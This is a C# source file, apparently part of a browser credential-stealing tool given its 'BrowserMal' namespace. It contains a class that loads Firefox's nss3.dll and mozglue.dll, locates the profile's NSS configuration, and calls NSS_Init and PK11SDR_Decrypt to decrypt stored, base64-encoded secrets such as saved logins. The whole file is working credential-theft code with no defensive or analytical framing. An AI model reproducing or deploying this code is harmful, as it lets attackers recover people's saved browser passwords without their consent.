using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;

namespace BrowserMal.Encryption
{
    public class GeckoDecryption
    {
        private IntPtr Nss3Lib;
        private IntPtr Mozglue;
        private readonly List<string> PROGRAM_FOLDERS = new List<string>()
        {
            Environment.ExpandEnvironmentVariables("%ProgramW6432%"),
            Environment.ExpandEnvironmentVariables("%ProgramFiles(x86)%")
        };

        [StructLayout(LayoutKind.Sequential)]
        public struct TSECItem
        {
            public int SECItemType;
            public IntPtr SECItemData;
            public int SECItemLen;
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern void FreeLibrary(IntPtr module);

        [DllImport("kernel32.dll")]
        public static extern IntPtr LoadLibrary(string dllFilePath);
        
        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate int DLLFunctionDelegate5(ref TSECItem data, ref TSECItem result, int cx);

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate long DLLFunctionDelegate(string path);

        private string FindMozzilaFolder(string name)
        {
            foreach (string folder in PROGRAM_FOLDERS)
            {
                string path = Path.Combine(folder, name);

                if (Directory.Exists(path))
                    return path;
            }

            return string.Empty;
        }

        private string FindConfigDir(string profileRoot)
        {
            string file = Directory.GetFiles(profileRoot, "*.txt", SearchOption.TopDirectoryOnly).Where(x => x.Contains("pkcs")).FirstOrDefault();
            string content = File.ReadAllText(file);

            Match m = Regex.Match(content, "configdir=\'sql:(.*?)\'", RegexOptions.Multiline);

            if (!m.Success)
                return string.Empty;

            return m.Groups[1].Value.Replace("\\\\", @"\");
        }

        public void Init(string directory, string name)
        {
            string configDir = FindConfigDir(directory);
            if (string.IsNullOrEmpty(configDir))
                return;

            string mozillaPath = FindMozzilaFolder(name);

            if (string.IsNullOrEmpty(mozillaPath))
                return;

            Mozglue = LoadLibrary(Path.Combine(mozillaPath, "mozglue.dll"));
            Nss3Lib = LoadLibrary(Path.Combine(mozillaPath, "nss3.dll"));

            IntPtr pProc = GetProcAddress(Nss3Lib, "NSS_Init");
            DLLFunctionDelegate dll = (DLLFunctionDelegate)Marshal.GetDelegateForFunctionPointer(pProc, typeof(DLLFunctionDelegate));
            
            dll(configDir);
        }

        public string Decrypt(string cypherText)
        {
            IntPtr ffDataUnmanagedPointer = IntPtr.Zero;
            //StringBuilder sb = new StringBuilder(cypherText);
            try
            {
                byte[] ffData = Convert.FromBase64String(cypherText);

                ffDataUnmanagedPointer = Marshal.AllocHGlobal(ffData.Length);
                Marshal.Copy(ffData, 0, ffDataUnmanagedPointer, ffData.Length);

                TSECItem tSecDec = new TSECItem();
                TSECItem item = new TSECItem();
                item.SECItemType = 0;
                item.SECItemData = ffDataUnmanagedPointer;
                item.SECItemLen = ffData.Length;

                /*int hi2 = NSSBase64_DecodeBuffer(IntPtr.Zero, IntPtr.Zero, sb, sb.Length);
                TSECItem tSecDec = new TSECItem();
                TSECItem item = (TSECItem)Marshal.PtrToStructure(new IntPtr(hi2), typeof(TSECItem));*/

                if (PK11SDR_Decrypt(ref item, ref tSecDec, 0) == 0)
                {
                    if (tSecDec.SECItemLen != 0)
                    {
                        byte[] bvRet = new byte[tSecDec.SECItemLen];
                        Marshal.Copy(tSecDec.SECItemData, bvRet, 0, tSecDec.SECItemLen);
                        return Encoding.ASCII.GetString(bvRet);
                    }
                }
            }
            catch (Exception)
            {
                return null;
            }
            finally
            {
                if (ffDataUnmanagedPointer != IntPtr.Zero)
                {
                    Marshal.FreeHGlobal(ffDataUnmanagedPointer);

                }
            }

            return null;
        }

        /*[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        public delegate int DLLFunctionDelegate4(IntPtr arenaOpt, IntPtr outItemOpt, StringBuilder inStr, int inLen);
        public int NSSBase64_DecodeBuffer(IntPtr arenaOpt, IntPtr outItemOpt, StringBuilder inStr, int inLen)
        {
            IntPtr pProc = GetProcAddress(Nss3Lib, "NSSBase64_DecodeBuffer");
            DLLFunctionDelegate4 dll = (DLLFunctionDelegate4)Marshal.GetDelegateForFunctionPointer(pProc, typeof(DLLFunctionDelegate4));
            return dll(arenaOpt, outItemOpt, inStr, inLen);
        }*/

        public void Unload()
        {
            if (Nss3Lib != IntPtr.Zero)
                FreeLibrary(Nss3Lib);

            if (Mozglue != IntPtr.Zero)
                FreeLibrary(Mozglue);
        }

        public int PK11SDR_Decrypt(ref TSECItem data, ref TSECItem result, int cx)
        {
            IntPtr procAddress = GetProcAddress(Nss3Lib, "PK11SDR_Decrypt");
            DLLFunctionDelegate5 dllfunctionDelegate = (DLLFunctionDelegate5)Marshal.GetDelegateForFunctionPointer(procAddress, typeof(DLLFunctionDelegate5));
            return dllfunctionDelegate(ref data, ref result, cx);
        }
    }
}
